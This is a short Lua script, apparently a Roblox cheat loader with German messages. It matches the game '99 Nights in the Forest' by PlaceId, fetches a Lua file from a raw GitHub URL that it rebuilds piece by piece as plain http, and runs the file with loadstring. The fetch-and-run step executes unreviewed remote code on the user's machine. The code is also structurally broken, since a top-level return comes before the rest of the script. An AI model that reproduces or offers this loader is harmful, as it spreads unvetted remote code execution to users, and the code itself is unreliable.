return {
    ["99 Nights in the Forest"] = { id = 79546208627805, url = "https://raw.githubusercontent.com/LuckyIIIV/loader/main/xjjsso332.lua" }
}
local _t = ...
local _g7 = game.PlaceId
for _n2, _v8 in pairs(_t) do
    if _v8.id == _g7 then
        local _s, _f1 = pcall(loadstring, game:HttpGet(table.concat({"ht","tp:","//",_v8.url:match("://(.+)")})))
        if _s and _f1 then _f1() else warn("Script fur ".._n2.." konnte nicht geladen werden") end
        return
    end
end
warn("Spiel nicht unterstutzt: PlaceID ".._g7)
